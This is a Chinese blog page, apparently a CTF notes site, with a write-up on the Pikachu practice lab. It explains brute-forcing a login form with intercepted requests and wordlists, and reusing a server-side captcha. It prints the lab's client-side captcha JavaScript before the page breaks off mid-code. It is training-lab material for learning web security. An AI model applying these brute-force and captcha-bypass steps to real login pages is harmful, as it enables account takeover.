<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-CTF/Misc/靶场/pikachu" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">pikachu | C0rr3ct</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://C0rr3c7.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://C0rr3c7.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://C0rr3c7.github.io/docs/CTF/Misc/靶场/pikachu"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="pikachu | C0rr3ct"><meta data-rh="true" name="description" content="暴力破解"><meta data-rh="true" property="og:description" content="暴力破解"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://C0rr3c7.github.io/docs/CTF/Misc/靶场/pikachu"><link data-rh="true" rel="alternate" href="https://C0rr3c7.github.io/docs/CTF/Misc/靶场/pikachu" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://C0rr3c7.github.io/docs/CTF/Misc/靶场/pikachu" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="C0rr3ct RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="C0rr3ct Atom Feed">





<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/styles.aff420c1.css">
<script src="/assets/js/runtime~main.3f5cae2e.js" defer="defer"></script>
<script src="/assets/js/main.4a9d0a45.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">C0rr3rt</b></a><a class="navbar__item navbar__link" href="/docs/HackMyVm/">HackMyVm</a><a class="navbar__item navbar__link" href="/docs/VulnHub/">VulnHub</a><a class="navbar__item navbar__link" href="/docs/HackTheBox/">HackTheBox</a><a class="navbar__item navbar__link" href="/docs/category/vulnstack">VulnStack</a><a class="navbar__item navbar__link" href="/docs/category/玄机">应急响应</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/CTF/">CTF</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/about">关于</a><a class="navbar__item navbar__link" href="/blog">Blog</a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="搜索" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/CTF/">CTF</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/ciscnccb">ciscn&amp;&amp;ccb</a><button aria-label="展开侧边栏分类 &#x27;ciscn&amp;&amp;ccb&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/buuctf">BUUCTF</a><button aria-label="展开侧边栏分类 &#x27;BUUCTF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/category/ctfshow">CTFSHOW</a><button aria-label="展开侧边栏分类 &#x27;CTFSHOW&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/category/misc">Misc</a><button aria-label="折叠侧边栏分类 &#x27;Misc&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/靶场">靶场</a><button aria-label="折叠侧边栏分类 &#x27;靶场&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/CTF/Misc/靶场/pikachu">pikachu</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/靶场/sqli-labs">sqli-labs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/靶场/upload-labs">upload-labs</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/2022鹏程杯-web">2022鹏程杯-web</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/2023蓝帽杯Love PHP">2023蓝帽杯Love PHP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/2024强网复现">2024强网复现</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/2024红明谷">2024红明谷</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/NSSCTF Round-20 Basic个人WEB专场">NSSCTF Round-20 Basic个人WEB专场</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/NewStarCTF2023">NewStarCTF2023</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/Nodejs常见漏洞">Nodejs常见漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/PHP之preg-match绕过">PHP之preg-match绕过</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/PHP反序列化">PHP反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/SHCTF2023">SHCTF2023</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/ctf-nodejs">ctf-nodejs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/ctf-python">ctf-python</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/nss">鹤城杯 2021EasyP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/安洵杯2019-easy_serialize_php">安洵杯2019-easy_serialize_php</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/第三届黄河流域公安院校网络安全技能挑战赛">第三届黄河流域公安院校网络安全技能挑战赛</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/网鼎杯2018-Fakebook">网鼎杯2018-Fakebook</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/CTF/Misc/羊城杯2020">羊城杯2020</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/misc"><span itemprop="name">Misc</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/靶场"><span itemprop="name">靶场</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">pikachu</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>pikachu</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="暴力破解">暴力破解<a href="#暴力破解" class="hash-link" aria-label="暴力破解的直接链接" title="暴力破解的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="基于表单的暴力破解">基于表单的暴力破解<a href="#基于表单的暴力破解" class="hash-link" aria-label="基于表单的暴力破解的直接链接" title="基于表单的暴力破解的直接链接">​</a></h3>
<p>挂上代理，抓包，选择clusterbomb模式，设置两个payload</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720143541566.png" alt="image-20230720143541566" class="img_ev3q"></p>
<p>分别将字典导入payload1和payload2，开始爆破</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144032127.png" alt="image-20230720144032127" class="img_ev3q"></p>
<p>admin和123456登录成功</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144158701.png" alt="image-20230720144158701" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="验证码绕过on-server">验证码绕过(on server)<a href="#验证码绕过on-server" class="hash-link" aria-label="验证码绕过(on server)的直接链接" title="验证码绕过(on server)的直接链接">​</a></h3>
<p>输入用户名，密码，验证码进行抓包</p>
<p>发送到重放器发现，只更改用户名和密码，页面显示</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144826758.png" alt="image-20230720144826758" class="img_ev3q"></p>
<p>再尝试改一下验证码，发现验证码错误</p>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720144952690.png" alt="image-20230720144952690" class="img_ev3q"></p>
<p>猜测一个验证码可以进行多次登录，直接将用户名和密码作为payload位置就可以</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="原理源码">原理，源码<a href="#原理源码" class="hash-link" aria-label="原理，源码的直接链接" title="原理，源码的直接链接">​</a></h4>
<p><img decoding="async" loading="lazy" src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230720145550989.png" alt="image-20230720145550989" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="验证码绕过on-client">验证码绕过(on client)<a href="#验证码绕过on-client" class="hash-link" aria-label="验证码绕过(on client)的直接链接" title="验证码绕过(on client)的直接链接">​</a></h3>
<p>根据提示，查看js代码</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> code</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">//在全局 定义验证码</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">createCode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        code </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> codeLength </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">;</span><span class="token comment" style="color:#999988;font-style:italic">//验证码的长度</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> checkCode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">getElementById</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;checkCode&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> selectChar </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">Array</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;A&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;B&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;C&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;D&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;E&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;F&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;G&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;H&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;I&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;J&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;K&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;L&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;M&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;N&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;O&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;P&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;Q&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;R&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;S&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;T&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;U&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;V&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;W&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;X&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;Y&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;Z&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token comment" style="color:#999988;font-style:italic">//所有候选组成验证码的字符，当然也可以用中文的</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword control-flow" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> codeLength</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> charIndex </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token known-class-name class-name">Math</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">floor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token known-class-name class-name">Math</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">random</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">36</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            code </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> selectChar</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">charIndex</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">//alert(code);</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword control-flow" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">checkCode</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            checkCode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">className</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;code&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            checkCode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">value</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> code</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">validate</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> inputCode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">querySelector</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;#bf_client .vcode&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">value</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword control-flow" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">inputCode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">length</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token function" style="color:#d73a49">alert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;请输入验证码！&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword control-flow" style="color:#00009f">return</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">false</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span 